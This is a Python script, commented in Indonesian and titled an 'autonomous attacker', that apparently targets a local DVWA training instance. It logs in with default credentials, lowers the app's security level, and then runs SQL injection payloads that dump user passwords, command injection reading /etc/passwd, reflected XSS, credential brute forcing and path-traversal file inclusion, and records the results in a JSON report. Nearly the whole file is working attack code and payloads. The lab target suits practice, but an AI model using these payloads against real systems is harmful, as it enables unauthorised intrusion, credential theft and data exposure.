#!/usr/bin/env python3
"""
NOIR SOVEREIGN - DVWA AUTONOMOUS ATTACKER v3 FINAL
====================================================
Login fix: Gunakan setup.php dulu, lalu login dengan cookie+CSRF token yang benar.
Semua serangan dijalankan dengan sesi yang valid.
"""

import requests
import re
import time
import json
import datetime

TARGET = "http://localhost:9090"
LOG_FILE = "/root/htb_sandbox/dvwa_attack.log"
REPORT_FILE = "/root/htb_sandbox/dvwa_report.json"

session = requests.Session()
session.timeout = 15

results = {
    "timestamp": str(datetime.datetime.now()),
    "target": TARGET,
    "session_valid": False,
    "attacks": {}
}

def log(msg):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    try:
        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")
    except:
        pass

def extract_token(html):
    """Ekstrak CSRF user_token dari HTML"""
    patterns = [
        r"name=['\"]user_token['\"].*?value=['\"]([a-f0-9]{32})['\"]",
        r"value=['\"]([a-f0-9]{32})['\"].*?user_token",
        r"user_token.*?value=['\"]([a-f0-9]{32})['\"]",
    ]
    for pattern in patterns:
        m = re.search(pattern, html, re.IGNORECASE | re.DOTALL)
        if m:
            return m.group(1)
    # Fallback: cari semua 32-char hex
    hexes = re.findall(r"['\"]([a-f0-9]{32})['\"]", html)
    return hexes[0] if hexes else None

def setup_and_login():
    """Setup DB dan login ke DVWA dengan benar"""
    log("=" * 60)
    log("  NOIR SOVEREIGN v3 - DVWA ATTACKER FINAL")
    log("=" * 60)
    
    # Step 1: Kunjungi setup.php untuk mendapatkan cookie awal
    log("[*] Fase Setup: Menginisialisasi cookie sesi...")
    r = session.get(f"{TARGET}/setup.php", timeout=15)
    token = extract_token(r.text)
    log(f"[*] Setup token: {token[:16] if token else 'TIDAK DITEMUKAN'}...")
    
    if token:
        session.post(f"{TARGET}/setup.php",
                    data={"create_db": "Create / Reset Database", "user_token": token},
                    timeout=15)
        log("[+] Database direset/inisialisasi")
    
    time.sleep(2)
    
    # Step 2: GET login page untuk ambil token segar
    log("[*] Fase Login: Mengambil token login...")
    r2 = session.get(f"{TARGET}/login.php", timeout=15)
    login_token = extract_token(r2.text)
    log(f"[*] Login token: {login_token[:16] if login_token else 'TIDAK DITEMUKAN'}...")
    
    if not login_token:
        log("[!!!] Tidak dapat menemukan CSRF token di halaman login!")
        return False
    
    # Step 3: POST login dengan token + cookie yang sama
    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": login_token
    }
    r3 = session.post(f"{TARGET}/login.php", data=login_data, 
                     allow_redirects=True, timeout=15)
    
    log(f"[*] Login response URL: {r3.url}")
    log(f"[*] Login response HTTP: {r3.status_code}")
    
    # Cek keberhasilan
    if "index.php" in r3.url or "logout" in r3.text.lower() or "Welcome" in r3.text:
        log("[+] === LOGIN BERHASIL! SESI AKTIF ===")
        results["session_valid"] = True
        
        # Set security level ke LOW
        r4 = session.get(f"{TARGET}/security.php", timeout=15)
        sec_token = extract_token(r4.text)
        if sec_token:
            session.post(f"{TARGET}/security.php",
                        data={"security": "low", "seclev_submit": "Submit", 
                              "user_token": sec_token},
                        timeout=15)
            log("[+] Security level: LOW (maksimal kerentanan)")
        return True
    else:
        log(f"[-] Login gagal! Response: {r3.text[:300]}")
        return False

# ============================================================
# SERANGAN 1: SQL INJECTION
# ============================================================
def attack_sqli():
    log("\n[ATTACK 1] ===== SQL INJECTION =====")
    result = {"status": "UNTESTED", "data": [], "payloads_tried": 0}
    
    # Pastikan endpoint bisa diakses
    r = session.get(f"{TARGET}/vulnerabilities/sqli/", timeout=15)
    if "login" in r.url.lower():
        log("[!] Diredirect ke login - sesi tidak valid")
        result["status"] = "NO_SESSION"
        results["attacks"]["sql_injection"] = result
        return result
    
    payloads = [
        "' OR '1'='1",
        "1' OR '1'='1' -- -",
        "' UNION SELECT user,password FROM users -- -",
        "1' UNION SELECT user,password FROM users -- -",
        "1 OR 1=1-- -",
        "' OR 1=1#",
        "admin'-- -",
        "' UNION SELECT NULL,NULL -- -",
    ]
    
    for payload in payloads:
        try:
            r = session.get(f"{TARGET}/vulnerabilities/sqli/",
                           params={"id": payload, "Submit": "Submit"}, timeout=15)
            result["payloads_tried"] += 1
            
            # Cek keberhasilan
            users_found = re.findall(r"First name:.*?<br\s*/?>.*?Surname:.*?<br\s*/?>", r.text, re.IGNORECASE | re.DOTALL)
            if users_found and len(users_found) > 0:
                log(f"[!!!] SQL INJECTION BERHASIL! Payload: {payload}")
                result["status"] = "COMPROMISED"
                result["successful_payload"] = payload
                # Ekstrak nama user
                clean_users = [re.sub('<[^>]+>', '', u).strip() for u in users_found]
                result["data"] = clean_users[:5]
                log(f"[!!!] DATA USER TEREKSPOS ({len(clean_users)} entries):")
                for u in clean_users[:5]:
                    log(f"        -> {u}")
                break
            
            if "sql" in r.text.lower() and "error" in r.text.lower():
                log(f"[+] SQL Error terdeteksi dengan payload: {payload}")
                result["status"] = "ERROR_BASED"
        except Exception as e:
            log(f"[!] Payload error: {e}")
    
    if result["status"] == "UNTESTED":
        result["status"] = "BLOCKED"
        log(f"[-] SQLi: {result['payloads_tried']} payload diuji, tidak ada yang berhasil")
    
    results["attacks"]["sql_injection"] = result
    log(f"[RESULT] SQL Injection: {result['status']}")
    return result

# ============================================================
# SERANGAN 2: COMMAND INJECTION
# ============================================================
def attack_cmdi():
    log("\n[ATTACK 2] ===== COMMAND INJECTION =====")
    result = {"status": "UNTESTED", "output": [], "payloads_tried": 0}
    
    payloads = [
        "127.0.0.1; id",
        "127.0.0.1 && id",
        "127.0.0.1|id",
        "127.0.0.1; cat /etc/passwd | head -3",
        "127.0.0.1; whoami; hostname",
        "127.0.0.1; ls -la /root",
        "; id",
        "| id",
    ]
    
    for payload in payloads:
        try:
            r = session.post(f"{TARGET}/vulnerabilities/exec/",
                            data={"ip": payload, "Submit": "Submit"}, timeout=15)
            result["payloads_tried"] += 1
            
            if "login" in r.url.lower():
                result["status"] = "NO_SESSION"
                break
            
            # Deteksi keberhasilan command injection
            if re.search(r"uid=\d+\(", r.text):
                log(f"[!!!] COMMAND INJECTION BERHASIL! Payload: {payload}")
                result["status"] = "COMPROMISED"
                result["successful_payload"] = payload
                uid_matches = re.findall(r"uid=\d+\([^)]+\).*?(?:<br|$)", r.text)
                result["output"] = [re.sub('<[^>]+>', '', m).strip() for m in uid_matches[:3]]
                for o in result["output"]:
                    log(f"[!!!] OS Output: {o}")
                break
            
            if "root:x:" in r.text or "/bin/bash" in r.text:
                log(f"[!!!] FILE TERBACA via CMDi! Payload: {payload}")
                result["status"] = "COMPROMISED"
                result["successful_payload"] = payload
                break
                
            if "PING" in r.text or "bytes from" in r.text:
                log(f"[*] Normal ping respons — payload diblokir: {payload[:40]}")
        except Exception as e:
            log(f"[!] Error: {e}")
    
    if result["status"] == "UNTESTED":
        result["status"] = "BLOCKED"
        log("[-] Command Injection: tidak berhasil di security level ini")
    
    results["attacks"]["command_injection"] = result
    log(f"[RESULT] Command Injection: {result['status']}")
    return result

# ============================================================
# SERANGAN 3: XSS REFLECTED
# ============================================================
def attack_xss():
    log("\n[ATTACK 3] ===== XSS REFLECTED =====")
    result = {"status": "UNTESTED", "successful_payload": None}
    
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "<body onload=alert(1)>",
        "<ScRiPt>alert(1)</ScRiPt>",
    ]
    
    for payload in payloads:
        try:
            r = session.get(f"{TARGET}/vulnerabilities/xss_r/",
                           params={"name": payload}, timeout=15)
            
            if payload in r.text:
                log(f"[!!!] XSS REFLECTED BERHASIL! Payload di-render tanpa encoding:")
                log(f"[!!!] {payload}")
                result["status"] = "COMPROMISED"
                result["successful_payload"] = payload
                break
            elif "&lt;script&gt;" in r.text or "&#" in r.text:
                log(f"[*] Payload di-HTML-encode (diproteksi): {payload[:40]}")
                result["status"] = "ENCODED"
        except Exception as e:
            log(f"[!] Error: {e}")
    
    if result["status"] == "UNTESTED":
        result["status"] = "FILTERED"
        log("[-] XSS: semua payload diblokir atau di-encode")
    
    results["attacks"]["xss_reflected"] = result
    log(f"[RESULT] XSS Reflected: {result['status']}")
    return result

# ============================================================
# SERANGAN 4: BRUTE FORCE
# ============================================================
def attack_brute():
    log("\n[ATTACK 4] ===== BRUTE FORCE LOGIN =====")
    result = {"status": "UNTESTED", "attempts": 0, "cracked": None}
    
    credentials = [
        ("admin", "password"), ("gordonb", "abc123"), ("1337", "charley"),
        ("pablo", "letmein"), ("smithy", "password"),
        ("admin", "admin"), ("admin", "123456"), ("admin", "letmein"),
        ("admin", "qwerty"), ("admin", "12345"), ("admin", "dragon"),
    ]
    
    for username, password in credentials:
        try:
            # Ambil fresh token untuk setiap percobaan
            r_get = session.get(f"{TARGET}/vulnerabilities/brute/", timeout=15)
            token = extract_token(r_get.text)
            
            params = {"username": username, "password": password, "Login": "Login"}
            if token:
                params["user_token"] = token
            
            r = session.get(f"{TARGET}/vulnerabilities/brute/",
                           params=params, timeout=15)
            result["attempts"] += 1
            
            if "Welcome to the password protected area" in r.text:
                log(f"[!!!] BRUTE FORCE BERHASIL!")
                log(f"[!!!] Kredensial: {username}:{password}")
                result["status"] = "COMPROMISED"
                result["cracked"] = f"{username}:{password}"
                break
        except Exception as e:
            pass
        time.sleep(0.05)
    
    if result["status"] == "UNTESTED":
        result["status"] = "EXHAUSTED"
        log(f"[-] Brute Force: {result['attempts']} kombinasi dicoba")
    
    results["attacks"]["brute_force"] = result
    log(f"[RESULT] Brute Force: {result['status']}")
    return result

# ============================================================
# SERANGAN 5: LOCAL FILE INCLUSION
# ============================================================
def attack_lfi():
    log("\n[ATTACK 5] ===== LOCAL FILE INCLUSION =====")
    result = {"status": "UNTESTED", "files_leaked": []}
    
    payloads = [
        "../../../../../../etc/passwd",
        "../../../etc/passwd",
        "/etc/passwd",
        "../../../../../../etc/hostname",
        "../../../../../../proc/version",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
    ]
    
    for payload in payloads:
        try:
            r = session.get(f"{TARGET}/vulnerabilities/fi/",
                           params={"page": payload}, timeout=15)
            
            if "root:x:0:0" in r.text or "root:/bin/" in r.text:
                log(f"[!!!] LFI BERHASIL! /etc/passwd terbaca!")
                log(f"[!!!] Payload: {payload}")
                result["status"] = "COMPROMISED"
                result["successful_payload"] = payload
                lines = [l for l in r.text.split('\n') if 'root:' in l or '/bin/' in l][:5]
                result["files_leaked"] = lines
                for l in lines:
                    log(f"[!!!] {l.strip()}")
                break
        except Exception as e:
            log(f"[!] Error: {e}")
    
    if result["status"] == "UNTESTED":
        result["status"] = "BLOCKED"
        log("[-] LFI: semua payload diblokir")
    
    results["attacks"]["file_inclusion"] = result
    log(f"[RESULT] File Inclusion: {result['status']}")
    return result

# ============================================================
# LAPORAN FINAL
# ============================================================
def generate_report():
    log("\n" + "=" * 60)
    log("  LAPORAN AKHIR - NOIR SOVEREIGN v3")
    log("=" * 60)
    
    total = len(results["attacks"])
    compromised = sum(1 for v in results["attacks"].values() if v.get("status") == "COMPROMISED")
    
    log(f"[*] Target   : {TARGET}")
    log(f"[*] Sesi OK  : {results['session_valid']}")
    log(f"[*] Serangan : {total} vektor")
    log(f"[*] BERHASIL : {compromised}/{total} ({int(compromised/total*100) if total else 0}%)")
    log("")
    
    for name, data in results["attacks"].items():
        st = data.get("status", "N/A")
        icon = "!!!" if st == "COMPROMISED" else "---"
        extra = ""
        if data.get("successful_payload"):
            extra = f" | Payload: {data['successful_payload'][:50]}"
        elif data.get("cracked"):
            extra = f" | Cred: {data['cracked']}"
        elif data.get("data"):
            extra = f" | Data: {len(data['data'])} entries"
        log(f"  [{icon}] {name.upper():25s} : {st}{extra}")
    
    results["summary"] = {
        "total_attacks": total,
        "compromised": compromised,
        "success_rate": f"{int(compromised/total*100) if total else 0}%",
    }
    
    with open(REPORT_FILE, "w") as f:
        json.dump(results, f, indent=2, default=str)
    log(f"\n[+] JSON Report: {REPORT_FILE}")
    log("=" * 60)

# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    try:
        log("[*] NOIR SOVEREIGN DVWA ATTACKER v3 DIMULAI")
        time.sleep(2)
        
        if not setup_and_login():
            log("[!!!] Login gagal! Menghentikan serangan.")
        else:
            attack_sqli()
            attack_cmdi()
            attack_xss()
            attack_brute()
            attack_lfi()
            generate_report()
            
    except Exception as e:
        log(f"[FATAL] {e}")
        import traceback
        log(traceback.format_exc())
